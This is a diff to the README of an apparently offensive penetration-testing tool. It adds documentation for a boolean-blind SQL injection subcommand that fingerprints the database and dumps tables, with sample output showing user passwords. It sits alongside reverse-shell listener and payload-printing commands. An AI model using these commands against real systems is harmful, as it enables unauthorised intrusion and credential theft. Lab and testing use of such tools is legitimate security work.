@@ -31,6 +31,7 @@ hickok -l 9001,9002 --lhost 10.10.14.7   # multiple listeners, fixed LHOST
 hickok payloads 10.10.14.7 9001          # print reverse-shell one-liners
 hickok hand                              # act on wraith's latest run (found on its own)
 hickok hand path/to/findings.json        # ...or a specific one
+hickok sql -u 'http://host/p?id=1' -p id # walk a SQL-injectable parameter
 ```
 
 Inside the console:
@@ -44,6 +45,35 @@ hickok>
   interact 1        attach (detach with Ctrl-])
   kill 1            drop a session
 ```
+
+## SQL injection — `hickok sql`
+
+Walk a database through a boolean-blind injection — a small sqlmap. hickok
+calibrates a TRUE/FALSE oracle, fingerprints the DBMS (SQLite / MySQL / MSSQL /
+PostgreSQL), then reads anything out one bit at a time:
+
+```bash
+hickok sql -u 'http://host/db?id=1' -p id   # or just `hickok sql` to read it
+                                            # from wraith's latest SQLi finding
+```
+
+```
+hickok(sql)>
+  banner            DBMS version             user / db    current user / database
+  tables            list tables              columns <t>  a table's columns
+  dump <table>      dump its rows            query "<SELECT>"   extract one value
+```
+
+```
+hickok(sql)> dump users
+  id | username | password
+  ---+----------+-----------
+  1  | admin    | s3cr3t!
+  2  | alice    | wonderland
+```
+
+Boolean-blind is slow by nature (each character is binary-searched over many
+requests) — it prints the request count as it goes.
 
 ## The bridge — `hickok hand`
 
